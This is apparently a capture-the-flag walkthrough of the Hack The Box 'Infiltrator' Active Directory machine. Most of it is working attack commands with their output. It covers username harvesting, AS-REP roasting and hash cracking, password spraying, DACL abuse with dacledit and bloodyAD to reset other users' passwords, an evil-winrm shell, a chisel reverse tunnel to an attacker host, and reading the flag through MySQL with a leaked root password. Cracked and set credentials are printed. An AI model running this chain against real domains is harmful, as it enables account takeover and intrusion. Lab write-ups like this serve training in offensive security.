1, Port scan
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Infiltrator.htb
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 03:06:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-17T03:07:55+00:00; -9h59m41s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-17T03:07:54+00:00; -9h59m42s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-17T03:07:55+00:00; -9h59m41s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-17T03:07:54+00:00; -9h59m42s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-04-16T03:03:57
|_Not valid after:  2025-10-16T03:03:57
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-17T03:07:08+00:00
|_ssl-date: 2025-04-17T03:07:54+00:00; -9h59m42s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Page check
![](images/Pasted%20image%2020250417230837.png)
From the original page, we can find any useful pages or web-contents, so let's try to fuzz the valid web-contents.
```
ffuf -u http://infiltrator.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://infiltrator.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 31235, Words: 13845, Lines: 617, Duration: 68ms]
assets                  [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 45ms]
index.html              [Status: 200, Size: 31235, Words: 13845, Lines: 617, Duration: 110ms]
:: Progress: [4614/4614] :: Job [1/1] :: 784 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

All right, there is nothing interesting.
![](images/Pasted%20image%2020250417231347.png)
By checking the index page, we can find the name of roles for this company, I guess we can grab them to enumerate the valid account in this domain
```
curl -s http://infiltrator.htb/ | xmllint --html --xpath "//div/div/h4" -

<h4>.01 David Anderson</h4>
<h4>.02 Olivia Martinez</h4>
<h4>.03 Kevin Turner</h4>
<h4>.04 Amanda Walker</h4>
<h4>.05 Marcus Harris</h4>
<h4>.06 Lauren Clark</h4>
<h4>.07 Ethan Rodriguez</h4>

David Anderson
Olivia Martinez
Kevin Turner
Amanda Walker
Marcus Harris
Lauren Clark
Ethan Rodriguez
```
Let's try to make them into valid user formula
```
david_anderson@infiltrator.htb
david.anderson@infiltrator.htb
d_anderson@infiltrator.htb
d.anderson@infiltrator.htb
olivia_martinez@infiltrator.htb
olivia.martinez@infiltrator.htb
o_martinez@infiltrator.htb
o.martinez@infiltrator.htb
kevin_turner@infiltrator.htb
kevin.turner@infiltrator.htb
k_turner@infiltrator.htb
k.turner@infiltrator.htb
amanda_walker@infiltrator.htb
amanda.walker@infiltrator.htb
a_walker@infiltrator.htb
a.walker@infiltrator.htb
marcus_harris@infiltrator.htb
marcus.harris@infiltrator.htb
m_harris@infiltrator.htb
m.harris@infiltrator.htb
lauren_clark@infiltrator.htb
lauren.clark@infiltrator.htb
l_clark@infiltrator.htb
l.clark@infiltrator.htb
ethan_rodriguez@infiltrator.htb
ethan.rodriguez@infiltrator.htb
e_rodriguez@infiltrator.htb
e.rodriguez@infiltrator.htb
```

Let's come to the domain service, the port 88 has the kerberos-sec service, let's try to enumerate domain users
```
GetNPUsers.py infiltrator.htb/ -no-pass -usersfile user.txt -dc-ip 10.10.11.31

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User d.anderson@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User o.martinez@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User k.turner@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User a.walker@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User m.harris@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$l.clark@infiltrator.htb@INFILTRATOR.HTB:c847167320de38487b4a8d1a060be8be$37eb4474261c7e6b5d08e13f69ccb541c3c9f78482bfceb5a28679eca8babbc23a7526e9710adb9d0107470e016a298205b6a0428a8d31fe834532ebaa78418885ca68cd29fb6672047f03545a93654c585518a0be403ecb0bc1f1fc5d206936081cbf167b330fd34a72772431f95447c6ae660f47dab87a85e622f753561598891e6496254dadb3309c918312bb6c0388ef9804d896846fcca38052389eb08bc7f6ded41e8082672de245ce7ce78e23375e4ade7a7d8a520fe2b13d40b5dd5a8851bf550ca322d1273e2e70f0146efed1b5af2d0152892739f90a228dedc00b52c98e6de55dde07e849932fb3b315afb89b
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User e.rodriguez@infiltrator.htb doesn't have UF_DONT_REQUIRE_PREAUTH set

```
Then we successfully find the valid user `l.clark@infiltrator.htb`
And also, we can try to brute crack that hash with john
```
john clark.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
WAT?watismypass! ($krb5asrep$23$l.clark@infiltrator.htb@INFILTRATOR.HTB)     
1g 0:00:00:09 DONE (2025-04-17 23:19) 0.1010g/s 1061Kp/s 1061Kc/s 1061KC/s WAYHEY..WASHIDA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Here we go, we get `WAT?watismypass!`

Then we can try to use `bloodhound-python` to collect the information of this domain
```
bloodhound-python -u l.clark -p 'WAT?watismypass!' -c All -d infiltrator.htb -ns 10.10.11.31
```
But there is nothing interesting from this user, I guess we can check is there anyone reuse this password.
Firstly, I would try to make a new username list to help us enumerate
```
d.anderson
o.martinez
k.turner
a.walker
m.harris
e.rodriguez

```
Then let's use `crackmapexec` to do this
```
crackmapexec smb 10.10.11.31 -u username.txt -p 'WAT?watismypass!'

SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 


d.anderson@infiltrator.htb account is restricted because of

Logon Hours: The account might be restricted to log in only during specific hours or days.

Logon Workstations: The account might be restricted to log in only from specific workstations or computers.

Account Disabled: The account might be disabled or not allowed to log in.

Password Expiration or Change Requirement: The account might require the password to be changed on the next login, or the password has expired.

Domain Policy: There might be a domain policy in place that restricts the account from logging in under certain conditions (e.g., time of day, specific IP ranges).
```
That means we have to Synchronize time with the target domain
`sudo ntpdate infiltrator.htb`

Let's try to continue collect information from this user
```
bloodhound-python -u d.anderson -p 'WAT?watismypass!' -c All -d infiltrator.htb
-ns 10.10.11.31
```
Then we finally find something interesting here
![](images/Pasted%20image%2020250417140524.png)
`D.anderson` can control the group `Marketing Disgit`
![](images/Pasted%20image%2020250417140717.png)
And the group `Marketing Digital` only has the user `E.rodriguez`
That means we can change the password of `E.rodriguez` by `D.anderson`

Let's following the hints of bloodhound, 
First, change `d.anderson's` control permission for the MARKETING DIGITAL group to FullControl, and obtain `d.anderson`'s ticket.
```
#### Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'

```
In this place, the smb services of `d.anderson` could not be login successfully, so we have to get the TGT ticket firstly
```
impacket-getTGT 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip 10.10.11.31

export KRB5CCNAME=d.anderson.ccache

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.10.11.31

/home/wither/.local/bin/dacledit.py:876: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250417-141518.bak
[*] DACL modified successfully!

PS:always remember to Synchronize time with the target domain
```

Then we can continue to change the password `e.rodriguez`
```
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "d.anderson" -p "WAT?watismypass\!" set password "e.rodriguez" "12345678"

msldap.commons.exceptions.LDAPModifyException: New password doesn't match the complexity: The password must contains characters from three of the following categories: Uppercase, Lowercase, Digits, Special, Unicode Alphabetic not included in Uppercase and Lowercase

We have to change another complex password for this account

bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "d.anderson" -p "WAT?watismypass\!" set password "e.rodriguez" "@wither123456"
```

Then let's continue to check the user's path
![](images/Pasted%20image%2020250417141956.png)
`E.rodriguez` can add itself into the group `Chief marketing`
![](images/Pasted%20image%2020250417142103.png)
group `Chiefs marketing` could force change the password of `M.harris`

Let's follow the paths step by step:
Firstly, add into group
```
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --dc-ip 10.10.11.31 -u e.rodriguez -p "@wither123456" -k add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez
```

Secondly, change the password of `M.harris`
```
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "e.rodriguez" -p "@wither123456" set password "m.harris" "@wither123456"
```

From the bloodhound, we found `M.harris` is in the group `Remote Management`

Then we can use evil-winrm to get the shell
`m.harris:@wither123456` 
`evil-winrm -i infiltrator.htb -u m.harris -p '@wither123456'`
There is a tricky problem from this machine, we can not use password to access into the shell as `m.harris`

We have to try another way to get access to shell, I guess TGT ticket would be still useful here.
```
getTGT.py infiltrator.htb/m.harris:'@wither123456' -dc-ip 10.10.11.31
export KRB5CCNAME=m.harris.ccache

evil-winrm -i dc01.infiltrator.htb -u "m.harris" -r INFILTRATOR.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                                                                                                                                                                          
Cannot find KDC for realm "INFILTRATOR.HTB"                                                                                                                       
Error: Exiting with code 1

We need to change the file `/etc/krb5.conf`

[libdefaults]
    default_realm = INFILTRATOR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    clockskew = 300

[realms]
    INFILTRATOR.HTB = {
        kdc = dc01.infiltrator.htb
        admin_server = dc01.infiltrator.htb
    }

[domain_realm]
    .infiltrator.htb = infiltrator.HTB
    infiltrator.htb = infiltrator.HTB

Then we can successfully get access to the shell
```

3, shell as Administrator
After simple enumerating, I did not find anything interesting in this file system.So I would upload the `winpeas` to collect the information.
I found a `my.ini` from Output  Messenger Server Plugin
![](images/Pasted%20image%2020250417152134.png)

We can find something interesting from `/ProgramData`
![](images/Pasted%20image%2020250417161027.png)
We can download it and find a `OutputMysql.ini`
![](images/Pasted%20image%2020250417161107.png)
Then we can use `chisel` to port forwarding to our local machine
```
# local machine
chisel server -p 6150 --reverse
# target
.\chisel.exe client 10.10.16.5:6150 R:9292:127.0.0.1:9292
```
Then  login to database, and check the file
```
mysql -h 127.0.0.1 -P 9292 --skip-ssl -u root -pibWijteig5
SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');
```